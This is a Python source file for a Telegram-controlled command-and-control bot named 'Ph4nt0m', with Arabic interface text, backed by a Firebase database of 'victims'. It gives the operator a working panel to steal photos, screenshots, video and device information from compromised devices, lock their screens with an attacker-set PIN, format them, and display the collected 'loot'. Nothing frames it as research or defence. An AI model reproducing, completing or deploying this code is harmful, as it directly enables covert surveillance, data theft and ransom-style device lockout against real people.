#!/usr/bin/env python3
"""
Ph4nt0m C2 Bot - Full Control
"""
import os, json, threading, time, requests, base64
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, MessageHandler, filters
from firebase_admin import credentials, initialize_app, db

flask_app = Flask(__name__)
@flask_app.route('/')
def home(): return "System Active"

def run_flask():
    flask_app.run(host='0.0.0.0', port=int(os.environ.get("PORT",8000)))

BOT_TOKEN = os.environ["BOT_TOKEN"]
FIREBASE_URL = os.environ["FIREBASE_URL"]
if os.environ.get("FIREBASE_CREDS"):
    cred = credentials.Certificate(json.loads(os.environ["FIREBASE_CREDS"]))
    initialize_app(cred, {'databaseURL': FIREBASE_URL})
else:
    initialize_app(options={'databaseURL': FIREBASE_URL})

victims_ref = db.reference('victims')
current_victim = {}
last_seen = {}
ASK_PIN = 1
ASK_NOTIFY = 2

def get_victims():
    s = victims_ref.get()
    return {k:v for k,v in (s or {}).items() if v.get('online')}

async def send_file(update, data, name, caption):
    try: await update.message.reply_document(document=data, filename=name, caption=caption)
    except: pass

async def show_loot(update, vid):
    loot = db.reference(f'victims/{vid}/loot').get()
    if not loot:
        await update.message.reply_text("لا توجد مسروقات.")
        return
    items = sorted(loot.items(), key=lambda x: x[1].get('counter',0))
    ls = last_seen.get(vid, 0)
    fresh = [i for i in items if i[1].get('counter',0) > ls]
    if not fresh:
        await update.message.reply_text("لا جديد.")
        return
    for k, item in fresh:
        t, n, u, info = item.get('type'), item.get('name',''), item.get('url'), item.get('info')
        if info:
            await update.message.reply_text(str(info)[:4000])
        elif u:
            try:
                r = requests.get(u)
                if r.status_code==200:
                    ext = 'png' if t in ('screenshot','photo') else 'webm' if t=='video' else 'bin'
                    await send_file(update, r.content, f"{n}.{ext}", f"📎 {n}")
            except: pass
    if fresh:
        last_seen[vid] = fresh[-1][1].get('counter',0)

def vkbd():
    k = []
    for vid, info in get_victims().items():
        fg = info.get('fingerprint',{})
        k.append([InlineKeyboardButton(f"🖥 {vid} ({fg.get('plat','?')})", callback_data=f'sel_{vid}')])
    k.append([InlineKeyboardButton("🔄 تحديث", callback_data='ref'), InlineKeyboardButton("🗑️ مسح الكل", callback_data='delall')])
    return InlineKeyboardMarkup(k)

def ckbd():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📷 سحب الصور", callback_data='get_all_photos'), InlineKeyboardButton("📋 معلومات", callback_data='get_device_info')],
        [InlineKeyboardButton("🖼️ لقطة شاشة", callback_data='screenshot'), InlineKeyboardButton("🎥 فيديو", callback_data='record_video')],
        [InlineKeyboardButton("📳 اهتزاز", callback_data='vibrate'), InlineKeyboardButton("🔊 صوت", callback_data='play_sound')],
        [InlineKeyboardButton("🔦 فلاش ON", callback_data='flash_on'), InlineKeyboardButton("💡 فلاش OFF", callback_data='flash_off')],
        [InlineKeyboardButton("🔔 إشعار", callback_data='send_notify'), InlineKeyboardButton("🔒 قفل", callback_data='set_pin')],
        [InlineKeyboardButton("💣 فرمتة", callback_data='format'), InlineKeyboardButton("🚫 مسح", callback_data='leave')],
        [InlineKeyboardButton("📂 عرض المسروقات", callback_data='loot')],
        [InlineKeyboardButton("🔙 رجوع", callback_data='back')]
    ])

async def start(update, context):
    await update.message.reply_text("⚡ Ph4nt0m", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📟 الضحايا", callback_data='list')]]))

async def handle(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    d = q.data

    if d in ('list','back','ref'):
        v = get_victims()
        if not v:
            await q.edit_message_text("لا أجهزة", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄", callback_data='ref')]]))
            return
        await q.edit_message_text("اختر:", reply_markup=vkbd())
        return
    if d == 'delall':
        victims_ref.delete()
        last_seen.clear()
        await q.edit_message_text("تم", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📟", callback_data='list')]]))
        return
    if d.startswith('sel_'):
        vid = d[4:]
        if vid not in get_victims():
            await q.edit_message_text("غير متصل", reply_markup=vkbd())
            return
        current_victim[uid] = vid
        if vid not in last_seen: last_seen[vid] = 0
        await q.edit_message_text(f"✅ {vid}", reply_markup=ckbd())
        return

    vid = current_victim.get(uid)
    if not vid:
        await q.edit_message_text("اختر جهاز", reply_markup=vkbd())
        return
    if d == 'leave':
        victims_ref.child(vid).delete()
        if vid in last_seen: del last_seen[vid]
        del current_victim[uid]
        await q.edit_message_text("تم", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📟", callback_data='list')]]))
        return
    if d == 'set_pin':
        await q.edit_message_text("🔢 أرسل PIN (4 أرقام):")
        return ASK_PIN
    if d == 'send_notify':
        await q.edit_message_text("🔔 أرسل نص الإشعار:")
        return ASK_NOTIFY
    if d == 'loot':
        await show_loot(q, vid)
        await q.edit_message_text("✅ انتهى العرض", reply_markup=ckbd())
        return

    # أوامر
    params = {}
    if d == 'vibrate': params['duration'] = 5000
    elif d == 'record_video': params['duration'] = 10
    db.reference(f'victims/{vid}/command').set({"action":d, **params})
    await q.edit_message_text(f"✅ {d}", reply_markup=ckbd())
    time.sleep(3)
    await show_loot(q, vid)

async def pin_input(update, context):
    uid = update.message.from_user.id
    pin = update.message.text.strip()
    if len(pin)!=4 or not pin.isdigit():
        await update.message.reply_text("❌ 4 أرقام:")
        return ASK_PIN
    vid = current_victim.get(uid)
    if not vid: return ConversationHandler.END
    db.reference(f'victims/{vid}/command').set({"action":"lock_screen","pin":pin})
    await update.message.reply_text(f"🔒 {pin}")
    return ConversationHandler.END

async def notify_input(update, context):
    uid = update.message.from_user.id
    msg = update.message.text.strip()
    if not msg:
        await update.message.reply_text("❌ نص:")
        return ASK_NOTIFY
    vid = current_victim.get(uid)
    if not vid: return ConversationHandler.END
    db.reference(f'victims/{vid}/command').set({"action":"send_notification","message":msg})
    await update.message.reply_text(f"🔔 {msg}")
    return ConversationHandler.END

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(handle, pattern='^set_pin$'), CallbackQueryHandler(handle, pattern='^send_notify$')],
        states={ASK_PIN:[MessageHandler(filters.TEXT & ~filters.COMMAND, pin_input)], ASK_NOTIFY:[MessageHandler(filters.TEXT & ~filters.COMMAND, notify_input)]},
        fallbacks=[]
    )
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle))
    app.add_handler(conv)
    print("🤖 Ready")
    app.run_polling()

if __name__=="__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    main()
